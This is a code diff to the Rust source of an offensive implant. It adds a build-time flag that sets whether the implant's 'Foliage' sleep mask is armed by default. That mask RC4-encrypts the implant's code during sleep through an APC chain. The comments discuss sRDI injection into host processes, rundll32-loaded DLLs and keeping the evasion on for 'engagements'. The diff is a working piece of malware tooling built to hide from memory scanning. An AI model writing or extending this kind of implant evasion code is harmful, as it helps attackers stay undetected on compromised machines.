@@ -37,7 +37,27 @@ use nyx_implant_evasionsdk::foliage::{FoliagePlan, FoliageStep};
 /// chain + .text RC4 masking is active on every sleep cycle. The operator can
 /// disarm at runtime via `set_foliage_enabled(false)` if the target requires
 /// minimal footprint. See module docs for the 7-stage APC plan.
-static FOLIAGE_ENABLED: AtomicBool = AtomicBool::new(true);
+///
+/// Build-time override: set `NYX_FOLIAGE_OFF=1` to ship the implant with
+/// Foliage disarmed by default (the runtime `set_foliage_enabled` still works).
+/// This is for hosts where the APC-chain sleep mask is unstable in the loader
+/// context (e.g. `rundll32`-loaded PIC DLLs whose `.text`/thread context
+/// Foliage's NtSetContextThread restore mishandles, surfacing as
+/// STATUS_STACK_BUFFER_OVERRUN). sRDI-injected into a real host process the
+/// mask is expected to work — leave the default ON for engagements.
+static FOLIAGE_ENABLED: AtomicBool = AtomicBool::new(foliage_default_on());
+
+/// Compile-time default for the Foliage master switch. ON unless the build set
+/// `NYX_FOLIAGE_OFF=1` (see the `FOLIAGE_ENABLED` doc). `const fn` + `match`
+/// because `Option::map`/`unwrap_or` aren't stable as const fns yet.
+const fn foliage_default_on() -> bool {
+    match option_env!("NYX_FOLIAGE_OFF") {
+        // NYX_FOLIAGE_OFF=1 → ship disarmed. Any other value (0/empty/garbage)
+        // → still armed (operator must be explicit to disable).
+        Some(v) => !(v.len() == 1 && v.as_bytes()[0] == b'1'),
+        None => true,
+    }
+}
 
 /// Arm/disarm the Foliage sleep mask.
 pub fn set_foliage_enabled(on: bool) {
